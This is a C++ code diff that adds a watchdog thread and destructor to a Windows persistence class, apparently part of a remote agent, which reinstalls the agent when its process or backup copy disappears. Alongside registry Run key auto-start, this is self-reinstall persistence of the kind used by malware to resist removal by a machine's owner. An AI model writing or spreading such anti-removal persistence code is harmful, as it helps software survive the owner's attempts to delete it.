@@ -1,5 +1,6 @@
 #include "infrastructure/system/WindowsPersistence.hpp"
 #include "infrastructure/system/AdvancedPersistence.hpp"
+#include "domain/common/PersistenceWatchdog.hpp"
 
 #include <chrono>
 
@@ -15,6 +16,11 @@ static constexpr int WM_USER_SHUTDOWN = WM_USER + 1;
 WindowsPersistence::WindowsPersistence(std::string pc_id, std::string auto_start_name)
     : pc_id_(std::move(pc_id))
     , auto_start_name_(std::move(auto_start_name)) {}
+
+WindowsPersistence::~WindowsPersistence() {
+    stop_watchdog();
+    stop_anti_sleep();
+}
 
 void WindowsPersistence::configure_auto_start() {
     // Registry Run key (basic persistence)
@@ -155,6 +161,63 @@ void WindowsPersistence::pump_messages() {
 
 void WindowsPersistence::invoke_shutdown() {
     if (on_shutdown_) on_shutdown_();
+}
+
+// ── Watchdog and Self-Reinstall ────────────────────────────────
+
+bool WindowsPersistence::init_watchdog() {
+    // Create backup of current executable
+    domain::PersistenceWatchdog watchdog;
+    return watchdog.init_backup();
+}
+
+bool WindowsPersistence::init_self_reinstall() {
+    domain::SelfReinstall reinstall;
+    return reinstall.create_backup();
+}
+
+void WindowsPersistence::start_watchdog() {
+    if (watchdog_running_) return;
+    watchdog_running_ = true;
+
+    watchdog_thread_ = std::thread([this]() {
+        DWORD original_pid = GetCurrentProcessId();
+
+        while (watchdog_running_) {
+            // Check if process is still alive
+            HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, original_pid);
+            if (hProcess) {
+                DWORD exit_code = 0;
+                if (GetExitCodeProcess(hProcess, &exit_code) && exit_code != STILL_ACTIVE) {
+                    // Process died — try self-reinstall
+                    domain::SelfReinstall reinstall;
+                    reinstall.reinstall();
+                }
+                CloseHandle(hProcess);
+            }
+
+            // Periodic self-repair
+            static DWORD last_check = 0;
+            DWORD now = GetTickCount();
+            if (now - last_check > 300000) { // Every 5 minutes
+                // Check if backup still exists
+                domain::SelfReinstall reinstall;
+                if (!reinstall.agent_exists()) {
+                    reinstall.reinstall();
+                }
+                last_check = now;
+            }
+
+            Sleep(10000);
+        }
+    });
+}
+
+void WindowsPersistence::stop_watchdog() {
+    watchdog_running_ = false;
+    if (watchdog_thread_.joinable()) {
+        watchdog_thread_.join();
+    }
 }
 
 } // namespace nuub::infrastructure::system
